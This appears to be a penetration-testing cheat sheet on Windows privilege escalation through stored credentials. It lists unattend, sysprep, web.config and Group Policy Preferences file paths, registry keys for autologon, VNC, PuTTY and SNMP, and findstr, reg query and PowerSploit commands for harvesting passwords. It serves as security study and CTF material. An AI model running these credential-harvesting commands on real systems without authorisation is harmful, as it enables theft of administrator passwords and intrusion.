---
title: stored credentials
category: win privesc
order: 1
---


* [WPE-01 - Stored Credentials](https://pentestlab.blog/2017/04/19/stored-credentials/)
It is very common for administrators to use Windows Deployment Services in order to create an image of a Windows operating system and deploy this image in various systems through the network. This is called unattended installation. The problem with unattended installations is that the local administrator password is stored in various locations either in plaintext or as Base-64 encoded. These locations are:


## | cmdkeys
"cmdkey /list"

## | files unattended
```
C:\unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml
```

## | iis config
C:\inetpub\wwwroot\web.config

## | group policies

**[hackthebox]** querier

Local administrators passwords can also retrieved via the Group Policy Preferences. The Groups.xml file which contains the password is cached locally or it can be obtained from the domain controller as every domain user has read access to this file. The password is in an encrypted form but Microsoft has published the key and it can be decrypted.
```
C:\ProgramData\Microsoft\Group Policy\History\????\Machine\Preferences\Groups\Groups.xml
\\????\SYSVOL\\Policies\????\MACHINE\Preferences\Groups\Groups.xml
```

cpasswd attr
```
Services\Services.xml
ScheduledTasks\ScheduledTasks.xml
Printers\Printers.xml
Drives\Drives.xml
DataSources\DataSources.xml
```

## | commands to find credentials
```
findstr /si password *.txt
findstr /si password *.xml
findstr /si password *.ini

C:\> dir /b /s unattend.xml
C:\> dir /b /s web.config
C:\> dir /b /s sysprep.inf
C:\> dir /b /s sysprep.xml
C:\> dir /b /s *pass*
C:\> dir /b /s vnc.ini
```


# Registry
---
```
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"
```
## | puty
```
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"
```
## | mcaffee
```
%AllUsersProfile%Application Data\McAfee\Common Framework\SiteList.xml
```
## | VNC Stored
```
    reg query “HKCU\Software\ORL\WinVNC3\Password”
```
## | Windows Autologin:
```
    reg query “HKLM\SOFTWARE\Microsoft\WindowsNT\Currentversion\Winlogon”
```
## | SNMP Parameters:
```
    reg query “HKLM\SYSTEM\Current\ControlSet\Services\SNMP”
```

# Powersploit
---
```
Get-UnattendedInstallFile
Get-Webconfig
Get-ApplicationHost
Get-SiteListPassword
Get-CachedGPPPassword
Get-RegistryAutoLogon
```
